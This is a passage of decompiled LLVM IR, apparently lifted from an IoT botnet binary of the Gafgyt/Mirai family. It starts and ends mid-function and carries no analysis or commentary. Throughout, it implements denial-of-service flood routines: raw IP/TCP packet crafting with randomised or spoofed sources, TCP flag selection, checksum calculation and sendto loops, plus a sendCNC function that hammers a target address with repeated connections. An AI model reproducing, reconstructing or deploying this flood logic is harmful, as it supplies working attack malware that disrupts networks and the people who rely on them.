  store i32 %v2_10030, i32* %v2_10480, align 4
  %v1_10488 = load i32, i32* @sp, align 4
  %v2_10488 = add i32 %v1_10488, 4
  %v3_10488 = inttoptr i32 %v2_10488 to i32*
  store i32 16, i32* %v3_10488, align 4
  %v0_10490 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_102b8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_1049c = inttoptr i32 %v0_10490 to i32*
  %v7_1049c = call i32 @__libc_sendto(i32 %v0_101b0, i32* %v6_1049c, i32 %v1_102b8, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_104a0 = call i32 @rand_cmwc()
  %v3_104ac = urem i32 %v0_104a0, 65536
  store i32 %v3_104ac, i32* %r3.global-to-local, align 4
  store i32 %v1_10308, i32* %r2.global-to-local, align 4
  %v1_104b4 = trunc i32 %v0_104a0 to i8
  store i8 %v1_104b4, i8* %v5_1030c, align 4
  %v0_104b8 = load i32, i32* %r3.global-to-local, align 4
  %v3_104b837 = udiv i32 %v0_104b8, 256
  %v1_104bc = trunc i32 %v3_104b837 to i8
  %v2_104bc = load i32, i32* %r2.global-to-local, align 4
  %v3_104bc = add i32 %v2_104bc, 1
  %v4_104bc = inttoptr i32 %v3_104bc to i8*
  store i8 %v1_104bc, i8* %v4_104bc, align 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_ffc4, label %dec_label_pc_104cc, label %dec_label_pc_104e4

dec_label_pc_104cc:                               ; preds = %dec_label_pc_10478
  %v0_104cc = call i32 @rand_cmwc()
  %v3_104d4 = mul i32 %v0_104cc, 65536
  store i32 %v3_104d4, i32* %r3.global-to-local, align 4
  %extract.t91 = trunc i32 %v0_104cc to i8
  br label %dec_label_pc_10500

dec_label_pc_104e4:                               ; preds = %dec_label_pc_10478
  store i32 %v3_104ec.pre-phi, i32* %r3.global-to-local, align 4
  %v1_104f4 = call i32 @htons(i32 %v3_104ec.pre-phi)
  %extract.t92 = trunc i32 %v1_104f4 to i8
  br label %dec_label_pc_10500

dec_label_pc_10500:                               ; preds = %dec_label_pc_104cc, %dec_label_pc_104e4
  %v0_104cc.sink.off0 = phi i8 [ %extract.t91, %dec_label_pc_104cc ], [ %extract.t92, %dec_label_pc_104e4 ]
  store i32 %v1_10308, i32* %r2.global-to-local, align 4
  %v4_10504 = sext i8 %v0_104cc.sink.off0 to i32
  store i8 %v0_104cc.sink.off0, i8* %v4_103e4, align 2
  %v3_10510 = sdiv i32 %v4_10504, 256
  store i32 %v3_10510, i32* %r3.global-to-local, align 4
  %v1_10514 = trunc i32 %v3_10510 to i8
  %v2_10514 = load i32, i32* %r2.global-to-local, align 4
  %v3_10514 = add i32 %v2_10514, 3
  %v4_10514 = inttoptr i32 %v3_10514 to i8*
  store i8 %v1_10514, i8* %v4_10514, align 1
  %v0_10518 = call i32 @rand_cmwc()
  %v3_10524 = urem i32 %v0_10518, 65536
  store i32 %v3_10524, i32* %r3.global-to-local, align 4
  store i32 %v3_102e8, i32* %r2.global-to-local, align 4
  %v1_1052c = trunc i32 %v0_10518 to i8
  store i8 %v1_1052c, i8* %v4_1052c, align 4
  %v0_10530 = load i32, i32* %r3.global-to-local, align 4
  %v3_10530 = sdiv i32 %v0_10530, 256
  store i32 %v3_10530, i32* %r3.global-to-local, align 4
  %v1_10534 = trunc i32 %v3_10530 to i8
  %v2_10534 = load i32, i32* %r2.global-to-local, align 4
  %v3_10534 = add i32 %v2_10534, 5
  %v4_10534 = inttoptr i32 %v3_10534 to i8*
  store i8 %v1_10534, i8* %v4_10534, align 1
  %v1_1053c = call i32 @HackerScan2(i32 %storemerge12)
  store i32 %v1_1053c, i32* %r3.global-to-local, align 4
  %v1_10548 = call i32 @htonl(i32 %v1_1053c)
  store i32 %v1_10548, i32* %r2.global-to-local, align 4
  store i32 %v1_10548, i32* %v3_10554, align 4
  store i32 %v1_10424, i32* %r3.global-to-local, align 4
  %v2_10568 = load i8, i8* %v1_10428, align 2
  %v3_10568 = zext i8 %v2_10568 to i32
  store i32 %v3_10568, i32* %r2.global-to-local, align 4
  %v3_1056c = load i8, i8* %v2_1042c, align 1
  %v4_1056c = zext i8 %v3_1056c to i32
  %v4_10570 = mul nuw nsw i32 %v4_1056c, 256
  %v5_10570 = or i32 %v4_10570, %v3_10568
  store i32 %v5_10570, i32* %r3.global-to-local, align 4
  %v3_1057c = call i32 @csum(i8* %v4_10344, i32 %v5_10570)
  %sext7 = mul i32 %v3_1057c, 16777216
  %v1_10580 = sdiv i32 %sext7, 16777216
  store i32 %v1_10580, i32* %r3.global-to-local, align 4
  store i32 %v3_102e8, i32* %r2.global-to-local, align 4
  %v1_10588 = trunc i32 %v1_10580 to i8
  store i8 %v1_10588, i8* %v4_10448, align 2
  %v0_1058c = load i32, i32* %r3.global-to-local, align 4
  %v3_1058c41 = udiv i32 %v0_1058c, 256
  %v1_10590 = trunc i32 %v3_1058c41 to i8
  %v2_10590 = load i32, i32* %r2.global-to-local, align 4
  %v3_10590 = add i32 %v2_10590, 11
  %v4_10590 = inttoptr i32 %v3_10590 to i8*
  store i8 %v1_10590, i8* %v4_10590, align 1
  store i32 %stack_var_-100.0, i32* %r2.global-to-local, align 4
  store i32 %arg6, i32* %r3.global-to-local, align 4
  %v9_1059c = icmp eq i32 %stack_var_-100.0, %arg6
  br i1 %v9_1059c, label %dec_label_pc_105a4, label %dec_label_pc_105c8

dec_label_pc_105a4:                               ; preds = %dec_label_pc_10500
  %v2_105a8 = call i32 @__GI_time(i32* null)
  store i32 %v2_105a8, i32* %r2.global-to-local, align 4
  store i32 %v2_10464, i32* %r3.global-to-local, align 4
  %v8_105b8 = icmp sgt i32 %v2_105a8, %v2_10464
  br i1 %v8_105b8, label %dec_label_pc_105d8, label %dec_label_pc_105bc

dec_label_pc_105bc:                               ; preds = %dec_label_pc_105a4
  br label %dec_label_pc_10478

dec_label_pc_105c8:                               ; preds = %dec_label_pc_10500
  %v1_105cc = add i32 %stack_var_-100.0, 1
  store i32 %v1_105cc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10478

dec_label_pc_105d8:                               ; preds = %dec_label_pc_105a4, %dec_label_pc_10214, %dec_label_pc_101c8
  %v12_105e029 = phi i32 [ %v3_10224, %dec_label_pc_10214 ], [ %v3_101d8, %dec_label_pc_101c8 ], [ %v2_105a8, %dec_label_pc_105a4 ]
  br label %dec_label_pc_105dc

dec_label_pc_105dc:                               ; preds = %dec_label_pc_10168, %dec_label_pc_10010, %dec_label_pc_10098, %dec_label_pc_10080, %dec_label_pc_105d8
  %v12_105e0 = phi i32 [ %v3_10020, %dec_label_pc_10010 ], [ 0, %dec_label_pc_10098 ], [ %v3_10090, %dec_label_pc_10080 ], [ %v12_105e029, %dec_label_pc_105d8 ], [ %v2_1016c, %dec_label_pc_10168 ]
  store i32 %v3_ff94, i32* @r4, align 4
  store i32 %v6_ff94, i32* @fp, align 4
  ret i32 %v12_105e0

; uselistorder directives
  uselistorder i32 %v1_105cc, { 1, 0 }
  uselistorder i32 %v1_10580, { 1, 0 }
  uselistorder i32 %v3_10530, { 1, 0 }
  uselistorder i32 %v0_10518, { 1, 0 }
  uselistorder i32 %v3_10510, { 1, 0 }
  uselistorder i8 %v0_104cc.sink.off0, { 1, 0 }
  uselistorder i32 %v0_104cc, { 1, 0 }
  uselistorder i32 %v0_104a0, { 1, 0 }
  uselistorder i32 %stack_var_-100.0, { 0, 2, 1 }
  uselistorder i32 %v2_10464, { 1, 0, 2 }
  uselistorder i32 %v3_1044c, { 1, 0 }
  uselistorder i32 %v1_10440, { 1, 0 }
  uselistorder i32 %v1_10424, { 0, 2, 1 }
  uselistorder i32 %v3_104ec.pre-phi, { 1, 0 }
  uselistorder i8 %v0_103a8.sink.off0, { 1, 0 }
  uselistorder i32 %v3_103c8, { 2, 1, 0 }
  uselistorder i32 %v0_103a8, { 1, 0 }
  uselistorder i32 %v0_1037c, { 1, 0 }
  uselistorder i32 %v3_10374, { 1, 0 }
  uselistorder i32 %v1_10368, { 1, 0 }
  uselistorder i32 %v3_1035c, { 1, 0 }
  uselistorder i32 %v3_102e8, { 8, 6, 4, 7, 5, 2, 3, 13, 12, 11, 10, 9, 1, 0 }
  uselistorder i32 %v1_102b8, { 1, 0 }
  uselistorder i32 %v1_10270, { 1, 0 }
  uselistorder i32 %v1_10190, { 1, 0 }
  uselistorder i32 %v3_10108, { 1, 0 }
  uselistorder i32 %stack_var_-104.0, { 0, 2, 1 }
  uselistorder i32 %v2_100f4, { 1, 0, 2 }
  uselistorder i32 %v1_100a4, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v2_10030, { 1, 0, 2 }
  uselistorder i32 %v3_fff4, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-80, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 6, 7, 4, 5, 11, 8, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 23, 24, 21, 22, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 36, 34, 37, 39, 38, 40, 41, 45, 42, 43, 44, 1, 46, 48, 47, 49, 50, 52, 51, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 66, 65, 67, 68, 69, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 0 }
  uselistorder i32 26, { 0, 2, 1 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg4, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %arg2, { 2, 0, 3, 4, 1, 6, 5 }
  uselistorder label %dec_label_pc_105dc, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_10500, { 1, 0 }
  uselistorder label %dec_label_pc_103dc, { 1, 0 }
  uselistorder label %dec_label_pc_102b4, { 1, 0 }
  uselistorder label %dec_label_pc_10238, { 1, 0 }
  uselistorder label %dec_label_pc_10168, { 1, 0 }
  uselistorder label %dec_label_pc_10010, { 1, 0 }
}

define i32 @sendCNC(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10610 = call i32 @__GI_time(i32* null)
  %v2_1061c = add i32 %v2_10610, %arg3
  store i32 %arg1, i32* @r0, align 4
  %v1_1062c = call i32 @inet_addr(i32 %arg1)
  store i32 2, i32* %stack_var_-40, align 4
  %v3_10650 = urem i32 %arg2, 65536
  %v1_10658 = call i32 @htons(i32 %v3_10650)
  %v3_10698 = bitcast i32* %stack_var_-40 to %sockaddr*
  br label %dec_label_pc_106ac

dec_label_pc_10670:                               ; preds = %dec_label_pc_106ac
  %v0_1067c = call i32 @socket()
  %v4_10698 = call i32 @__libc_connect(i32 %v0_1067c, %sockaddr* %v3_10698, i32 16)
  %v1_106a0 = call i32 @sleep(i32 1)
  %v1_106a8 = call i32 @__libc_close(i32 %v0_1067c)
  br label %dec_label_pc_106ac

dec_label_pc_106ac:                               ; preds = %entry, %dec_label_pc_10670
  %v2_106b0 = call i32 @__GI_time(i32* null)
  %v5_106c0 = icmp slt i32 %v2_106b0, %v2_1061c
  br i1 %v5_106c0, label %dec_label_pc_10670, label %dec_label_pc_106c4

dec_label_pc_106c4:                               ; preds = %dec_label_pc_106ac
  ret i32 %v2_106b0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_106ac, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_106d0 = load i32, i32* @r4, align 4
  %v6_106d0 = load i32, i32* @fp, align 4
  store i32 67288, i32* %stack_var_-4, align 4
  %v2_106d4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_106d4, i32* @fp, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_10710 = icmp eq i32 %arg2, 0
  br i1 %v2_10710, label %dec_label_pc_10718, label %dec_label_pc_10738

dec_label_pc_10718:                               ; preds = %entry
  %v0_10718 = call i32 @rand_cmwc()
  %v3_10720 = mul i32 %v0_10718, 65536
  store i32 %v3_10720, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1075c

dec_label_pc_10738:                               ; preds = %entry
  %v3_10740 = urem i32 %arg2, 65536
  store i32 %v3_10740, i32* %r3.global-to-local, align 4
  %v1_10748 = call i32 @htons(i32 %v3_10740)
  br label %dec_label_pc_1075c

dec_label_pc_1075c:                               ; preds = %dec_label_pc_10718, %dec_label_pc_10738
  %v2_10760 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_10760, i32* %r3.global-to-local, align 4
  %v3_1076c = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-60)
  store i32 %v3_1076c, i32* %r3.global-to-local, align 4
  %v2_10774 = icmp eq i32 %v3_1076c, 0
  br i1 %v2_10774, label %dec_label_pc_10780, label %dec_label_pc_10d58

dec_label_pc_10780:                               ; preds = %dec_label_pc_1075c
  %v2_10780 = ptrtoint i32* %stack_var_-64 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 6, i32* @r2, align 4
  %v0_107a4 = call i32 @socket()
  store i32 %v0_107a4, i32* %r3.global-to-local, align 4
  %v2_107b4 = icmp eq i32 %v0_107a4, 0
  br i1 %v2_107b4, label %dec_label_pc_107bc, label %dec_label_pc_107d4

dec_label_pc_107bc:                               ; preds = %dec_label_pc_10780
  %v2_107c0 = load i32, i32* @global_var_28c44.54, align 4
  store i32 %v2_107c0, i32* %r3.global-to-local, align 4
  %v3_107cc = call i32 @HackerPrint(i32 %v2_107c0, i32 ptrtoint ([27 x i8]* @global_var_1edd8.737 to i32))
  br label %dec_label_pc_10d58

dec_label_pc_107d4:                               ; preds = %dec_label_pc_10780
  store i32 1, i32* %stack_var_-68, align 4
  %v2_107dc = ptrtoint i32* %stack_var_-68 to i32
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 %v2_107dc, i32* %r3.global-to-local, align 4
  %v6_107f8 = call i32 @__GI_setsockopt(i32 %v0_107a4, i32 0, i32 3, i32* nonnull %stack_var_-68, i32 4)
  store i32 %v6_107f8, i32* %r3.global-to-local, align 4
  %v1_10800 = icmp slt i32 %v6_107f8, 0
  br i1 %v1_10800, label %dec_label_pc_10808, label %dec_label_pc_10820

dec_label_pc_10808:                               ; preds = %dec_label_pc_107d4
  %v2_1080c = load i32, i32* @global_var_28c44.54, align 4
  store i32 %v2_1080c, i32* %r3.global-to-local, align 4
  %v3_10818 = call i32 @HackerPrint(i32 %v2_1080c, i32 ptrtoint ([33 x i8]* @global_var_1edf4.739 to i32))
  br label %dec_label_pc_10d58

dec_label_pc_10820:                               ; preds = %dec_label_pc_107d4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %v2_10824 = icmp eq i32 %arg4, 0
  br i1 %v2_10824, label %dec_label_pc_10850, label %dec_label_pc_10838

dec_label_pc_10838:                               ; preds = %dec_label_pc_10820
  %v1_1083c = sub i32 32, %arg4
  store i32 %v1_1083c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_10848 = shl i32 -1, %v1_1083c
  br label %dec_label_pc_10850

dec_label_pc_10850:                               ; preds = %dec_label_pc_10820, %dec_label_pc_10838
  %storemerge10 = phi i32 [ %v1_10848, %dec_label_pc_10838 ], [ 0, %dec_label_pc_10820 ]
  %v1_10854 = add i32 %arg6, 40
  %v1_10864 = add i32 %arg6, 46
  %v3_10868 = and i32 %v1_10864, -4
  %v1_10870 = load i32, i32* @sp, align 4
  %v2_10870 = sub i32 %v1_10870, %v3_10868
  %v1_10880 = add i32 %v2_10870, 11
  %v3_10884 = and i32 %v1_10880, -4
  store i32 %v3_10884, i32* %r2.global-to-local, align 4
  %v1_108a4 = add i32 %v3_10884, 20
  store i32 %v1_108a4, i32* %r3.global-to-local, align 4
  %v5_108a8 = inttoptr i32 %v1_108a4 to i8*
  %v3_108ac = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_108ac, i32* @r4, align 4
  %v1_108b4 = call i32 @HackerScan2(i32 %storemerge10)
  store i32 %v1_108b4, i32* %r3.global-to-local, align 4
  %v1_108c0 = call i32 @htonl(i32 %v1_108b4)
  store i32 %v1_108c0, i32* %r2.global-to-local, align 4
  %v1_108cc = add i32 %arg6, 20
  %v1_108d0 = load i32, i32* @sp, align 4
  %v2_108d0 = inttoptr i32 %v1_108d0 to i32*
  store i32 %v1_108cc, i32* %v2_108d0, align 4
  %v0_108d8 = load i32, i32* @r4, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v4_108e0 = inttoptr i32 %v3_10884 to i8*
  %v5_108e0 = call i32 @makeIPPacket(i8* %v4_108e0, i32 %v0_108d8, i32 %v1_108c0, i32 6)
  %v0_108e4 = call i32 @rand_cmwc()
  %v3_108f0 = urem i32 %v0_108e4, 65536
  store i32 %v3_108f0, i32* %r3.global-to-local, align 4
  store i32 %v1_108a4, i32* %r2.global-to-local, align 4
  %v1_108f8 = trunc i32 %v0_108e4 to i8
  store i8 %v1_108f8, i8* %v5_108a8, align 4
  %v0_108fc = load i32, i32* %r3.global-to-local, align 4
  %v3_108fc = sdiv i32 %v0_108fc, 256
  store i32 %v3_108fc, i32* %r3.global-to-local, align 4
  %v1_10900 = trunc i32 %v3_108fc to i8
  %v2_10900 = load i32, i32* %r2.global-to-local, align 4
  %v3_10900 = add i32 %v2_10900, 1
  %v4_10900 = inttoptr i32 %v3_10900 to i8*
  store i8 %v1_10900, i8* %v4_10900, align 1
  %v0_10904 = call i32 @rand_cmwc()
  %v2_10910 = add i32 %v3_10884, 24
  %v3_10910 = inttoptr i32 %v2_10910 to i32*
  store i32 %v0_10904, i32* %v3_10910, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_1091c = add i32 %v3_10884, 28
  %v3_1091c = inttoptr i32 %v2_1091c to i32*
  store i32 0, i32* %v3_1091c, align 4
  store i32 %v1_108a4, i32* %r2.global-to-local, align 4
  %v1_10924 = add i32 %v3_10884, 32
  %v2_10924 = inttoptr i32 %v1_10924 to i8*
  %v3_10924 = load i8, i8* %v2_10924, align 4
  %v1_10930 = urem i8 %v3_10924, 16
  %v1_10934 = or i8 %v1_10930, 80
  store i8 %v1_10934, i8* %v2_10924, align 4
  %v3_10944 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_10944, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1ee18.744 to i32), i32* @r1, align 4
  %v3_10950 = inttoptr i32 %v3_10944 to i8*
  %v4_10950 = call i32 @__GI_strcoll(i8* %v3_10950, i32 ptrtoint ([4 x i8]* @global_var_1ee18.744 to i32))
  store i32 %v4_10950, i32* %r3.global-to-local, align 4
  %v2_10958 = icmp eq i32 %v4_10950, 0
  br i1 %v2_10958, label %dec_label_pc_10960, label %dec_label_pc_109b4

dec_label_pc_10960:                               ; preds = %dec_label_pc_10850
  store i32 %v1_108a4, i32* %r2.global-to-local, align 4
  %v1_10964 = add i32 %v3_10884, 33
  %v2_10964 = inttoptr i32 %v1_10964 to i8*
  %v3_10964 = load i8, i8* %v2_10964, align 1
  %v4_10964 = zext i8 %v3_10964 to i32
  %v1_10968 = or i32 %v4_10964, 2
  store i32 %v1_10968, i32* %r3.global-to-local, align 4
  %v1_1096c = trunc i32 %v1_10968 to i8
  store i8 %v1_1096c, i8* %v2_10964, align 1
  store i32 %v1_108a4, i32* %r2.global-to-local, align 4
  %v3_10974 = load i8, i8* %v2_10964, align 1
  %v4_10974 = zext i8 %v3_10974 to i32
  %v1_10978 = or i32 %v4_10974, 4
  store i32 %v1_10978, i32* %r3.global-to-local, align 4
  %v1_1097c = trunc i32 %v1_10978 to i8
  store i8 %v1_1097c, i8* %v2_10964, align 1
  store i32 %v1_108a4, i32* %r2.global-to-local, align 4
  %v3_10984 = load i8, i8* %v2_10964, align 1
  %v4_10984 = zext i8 %v3_10984 to i32
  %v1_10988 = or i32 %v4_10984, 1
  store i32 %v1_10988, i32* %r3.global-to-local, align 4
  %v1_1098c = trunc i32 %v1_10988 to i8
  store i8 %v1_1098c, i8* %v2_10964, align 1
  store i32 %v1_108a4, i32* %r2.global-to-local, align 4
  %v3_10994 = load i8, i8* %v2_10964, align 1
  %v4_10994 = zext i8 %v3_10994 to i32
  %v1_10998 = or i32 %v4_10994, 16
  store i32 %v1_10998, i32* %r3.global-to-local, align 4
  %v1_1099c = trunc i32 %v1_10998 to i8
  store i8 %v1_1099c, i8* %v2_10964, align 1
  store i32 %v1_108a4, i32* %r2.global-to-local, align 4
  %v3_109a4 = load i8, i8* %v2_10964, align 1
  %v4_109a4 = zext i8 %v3_109a4 to i32
  %v1_109a8 = or i32 %v4_109a4, 8
  store i32 %v1_109a8, i32* %r3.global-to-local, align 4
  %v1_109ac = trunc i32 %v1_109a8 to i8
  store i8 %v1_109ac, i8* %v2_10964, align 1
  br label %dec_label_pc_10af8

dec_label_pc_109b4:                               ; preds = %dec_label_pc_10850
  %v3_109b4 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_109b4, i32* %r3.global-to-local, align 4
  store i32 %v3_109b4, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1ee1c.746 to i32), i32* @r1, align 4
  %v2_109c0 = call i32 @__GI_strtok(i32 %v3_109b4, i32 ptrtoint (i32* @global_var_1ee1c.746 to i32))
  store i32 %v2_109c0, i32* %r3.global-to-local, align 4
  %v2_10af020 = icmp eq i32 %v2_109c0, 0
  br i1 %v2_10af020, label %dec_label_pc_10af8, label %dec_label_pc_109d0.lr.ph

dec_label_pc_109d0.lr.ph:                         ; preds = %dec_label_pc_109b4
  %v1_109f0 = add i32 %v3_10884, 33
  %v2_109f0 = inttoptr i32 %v1_109f0 to i8*
  br label %dec_label_pc_109d0

dec_label_pc_109d0:                               ; preds = %dec_label_pc_109d0.lr.ph, %dec_label_pc_10ad8
  %storemerge1421 = phi i32 [ %v2_109c0, %dec_label_pc_109d0.lr.ph ], [ %v2_10ae0, %dec_label_pc_10ad8 ]
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1ee20.748 to i32), i32* @r1, align 4
  %v3_109dc = inttoptr i32 %storemerge1421 to i8*
  %v4_109dc = call i32 @__GI_strcoll(i8* %v3_109dc, i32 ptrtoint ([4 x i8]* @global_var_1ee20.748 to i32))
  store i32 %v4_109dc, i32* %r3.global-to-local, align 4
  %v2_109e4 = icmp eq i32 %v4_109dc, 0
  br i1 %v2_109e4, label %dec_label_pc_109ec, label %dec_label_pc_10a00

dec_label_pc_109ec:                               ; preds = %dec_label_pc_109d0
  store i32 %v1_108a4, i32* %r2.global-to-local, align 4
  %v3_109f0 = load i8, i8* %v2_109f0, align 1
  %v4_109f0 = zext i8 %v3_109f0 to i32
  %v1_109f4 = or i32 %v4_109f0, 2
  store i32 %v1_109f4, i32* %r3.global-to-local, align 4
  %v1_109f8 = trunc i32 %v1_109f4 to i8
  store i8 %v1_109f8, i8* %v2_109f0, align 1
  br label %dec_label_pc_10ad8

dec_label_pc_10a00:                               ; preds = %dec_label_pc_109d0
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1ee24.750 to i32), i32* @r1, align 4
  %v4_10a0c = call i32 @__GI_strcoll(i8* %v3_109dc, i32 ptrtoint ([4 x i8]* @global_var_1ee24.750 to i32))
  store i32 %v4_10a0c, i32* %r3.global-to-local, align 4
  %v2_10a14 = icmp eq i32 %v4_10a0c, 0
  br i1 %v2_10a14, label %dec_label_pc_10a1c, label %dec_label_pc_10a30

dec_label_pc_10a1c:                               ; preds = %dec_label_pc_10a00
  store i32 %v1_108a4, i32* %r2.global-to-local, align 4
  %v3_10a20 = load i8, i8* %v2_109f0, align 1
  %v4_10a20 = zext i8 %v3_10a20 to i32
  %v1_10a24 = or i32 %v4_10a20, 4
  store i32 %v1_10a24, i32* %r3.global-to-local, align 4
  %v1_10a28 = trunc i32 %v1_10a24 to i8
  store i8 %v1_10a28, i8* %v2_109f0, align 1
  br label %dec_label_pc_10ad8

dec_label_pc_10a30:                               ; preds = %dec_label_pc_10a00
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1ee28.752 to i32), i32* @r1, align 4
  %v4_10a3c = call i32 @__GI_strcoll(i8* %v3_109dc, i32 ptrtoint ([4 x i8]* @global_var_1ee28.752 to i32))
  store i32 %v4_10a3c, i32* %r3.global-to-local, align 4
  %v2_10a44 = icmp eq i32 %v4_10a3c, 0
  br i1 %v2_10a44, label %dec_label_pc_10a4c, label %dec_label_pc_10a60

dec_label_pc_10a4c:                               ; preds = %dec_label_pc_10a30
  store i32 %v1_108a4, i32* %r2.global-to-local, align 4
  %v3_10a50 = load i8, i8* %v2_109f0, align 1
  %v4_10a50 = zext i8 %v3_10a50 to i32
  %v1_10a54 = or i32 %v4_10a50, 1
  store i32 %v1_10a54, i32* %r3.global-to-local, align 4
  %v1_10a58 = trunc i32 %v1_10a54 to i8
  store i8 %v1_10a58, i8* %v2_109f0, align 1
  br label %dec_label_pc_10ad8

dec_label_pc_10a60:                               ; preds = %dec_label_pc_10a30
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1ee2c.754 to i32), i32* @r1, align 4
  %v4_10a6c = call i32 @__GI_strcoll(i8* %v3_109dc, i32 ptrtoint ([4 x i8]* @global_var_1ee2c.754 to i32))
  store i32 %v4_10a6c, i32* %r3.global-to-local, align 4
  %v2_10a74 = icmp eq i32 %v4_10a6c, 0
  br i1 %v2_10a74, label %dec_label_pc_10a7c, label %dec_label_pc_10a90

dec_label_pc_10a7c:                               ; preds = %dec_label_pc_10a60
  store i32 %v1_108a4, i32* %r2.global-to-local, align 4
  %v3_10a80 = load i8, i8* %v2_109f0, align 1
  %v4_10a80 = zext i8 %v3_10a80 to i32
  %v1_10a84 = or i32 %v4_10a80, 16
  store i32 %v1_10a84, i32* %r3.global-to-local, align 4
  %v1_10a88 = trunc i32 %v1_10a84 to i8
  store i8 %v1_10a88, i8* %v2_109f0, align 1
  br label %dec_label_pc_10ad8

dec_label_pc_10a90:                               ; preds = %dec_label_pc_10a60
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1ee30.756 to i32), i32* @r1, align 4
  %v4_10a9c = call i32 @__GI_strcoll(i8* %v3_109dc, i32 ptrtoint ([4 x i8]* @global_var_1ee30.756 to i32))
  store i32 %v4_10a9c, i32* %r3.global-to-local, align 4
  %v2_10aa4 = icmp eq i32 %v4_10a9c, 0
  br i1 %v2_10aa4, label %dec_label_pc_10aac, label %dec_label_pc_10ac0

dec_label_pc_10aac:                               ; preds = %dec_label_pc_10a90
  store i32 %v1_108a4, i32* %r2.global-to-local, align 4
  %v3_10ab0 = load i8, i8* %v2_109f0, align 1
  %v4_10ab0 = zext i8 %v3_10ab0 to i32
  %v1_10ab4 = or i32 %v4_10ab0, 8
  store i32 %v1_10ab4, i32* %r3.global-to-local, align 4
  %v1_10ab8 = trunc i32 %v1_10ab4 to i8
  store i8 %v1_10ab8, i8* %v2_109f0, align 1
  br label %dec_label_pc_10ad8

dec_label_pc_10ac0:                               ; preds = %dec_label_pc_10a90
  %v2_10ac4 = load i32, i32* @global_var_28c44.54, align 4
  store i32 %v2_10ac4, i32* %r3.global-to-local, align 4
  store i32 %storemerge1421, i32* @r2, align 4
  %v3_10ad4 = call i32 @HackerPrint(i32 %v2_10ac4, i32 ptrtoint ([18 x i8]* @global_var_1ee34.758 to i32))
  br label %dec_label_pc_10ad8

dec_label_pc_10ad8:                               ; preds = %dec_label_pc_10aac, %dec_label_pc_10a7c, %dec_label_pc_10a4c, %dec_label_pc_10a1c, %dec_label_pc_109ec, %dec_label_pc_10ac0
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1ee1c.746 to i32), i32* @r1, align 4
  %v2_10ae0 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1ee1c.746 to i32))
  store i32 %v2_10ae0, i32* %r3.global-to-local, align 4
  %v2_10af0 = icmp eq i32 %v2_10ae0, 0
  br i1 %v2_10af0, label %dec_label_pc_10af8, label %dec_label_pc_109d0

dec_label_pc_10af8:                               ; preds = %dec_label_pc_10ad8, %dec_label_pc_109b4, %dec_label_pc_10960
  %v0_10af8 = call i32 @rand_cmwc()
  %v3_10b04 = urem i32 %v0_10af8, 65536
